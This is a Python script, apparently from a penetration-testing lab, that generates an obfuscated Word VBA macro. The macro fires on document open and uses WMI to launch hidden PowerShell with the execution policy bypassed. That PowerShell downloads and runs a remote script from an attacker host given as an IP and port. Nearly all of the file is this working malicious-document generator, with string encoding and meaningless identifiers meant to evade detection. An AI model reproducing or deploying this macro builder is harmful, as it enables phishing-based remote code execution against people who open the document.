import sys

def encrypt_string(string, key):
    output = ""
    for c in string:
        output += '{0:03}'.format((ord(c) + key) % 256)
    return output

template = """
Function EshuuT2EeM(DaiPaephoo)
    EshuuT2EeM = Chr(DaiPaephoo - %(encryption_key)s)
End Function

Function GahchiShei(QuohkeeQuu)
    GahchiShei = Left(QuohkeeQuu, 3)
End Function

Function DaseshahYa(ThaoXeijak)
    DaseshahYa = Right(ThaoXeijak, Len(ThaoXeijak) - 3)
End Function

Function Raabajomai(Thotohcoob)
    Do
        ExaiPodeeR = ExaiPodeeR + EshuuT2EeM(GahchiShei(Thotohcoob))
        Thotohcoob = DaseshahYa(Thotohcoob)
    Loop While Len(Thotohcoob) > 0
    Raabajomai = ExaiPodeeR
End Function

Function MyMacro()
    If ActiveDocument.Name <> Raabajomai("%(encrypted_docname)s") Then
        Exit Function
    End If
    Dim IhaweiQuoz As String
    Dim AhShaiwiel As String
    
    IhaweiQuoz = "%(encrypted_cmd)s"
    AhShaiwiel = Raabajomai(IhaweiQuoz)
    GetObject(Raabajomai("%(encrypted_winmgmts)s")).Get(Raabajomai("%(encrypted_win32process)s")).Create AhShaiwiel, EedaiJeesu, Sheihohgha, UuvoiWeVah   
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
"""

def generate_vba(docname, command, key):
    encrypted_cmd = encrypt_string(command, key)
    encrypted_docname = encrypt_string(docname, key)
    encrypted_winmgmts = encrypt_string("winmgmts:", key)
    encrypted_win32process = encrypt_string("Win32_Process", key)
    output = template % {'encrypted_docname': encrypted_docname,'encrypted_cmd': encrypted_cmd, 'encrypted_winmgmts': encrypted_winmgmts, 'encrypted_win32process': encrypted_win32process, 'encryption_key': str(key)}
    print(output)


ip="192.168.49.179"
port=8000
script_name="runme.ps1"
if len(sys.argv) > 1:
    ip = sys.argv[1]
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    if len(sys.argv) > 3:
        script_name = sys.argv[3]
url=f"http://{ip}:{port}/{script_name}"
command = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('{url}'))"
key = 17
docname = "app.doc"
generate_vba(docname, command, key)
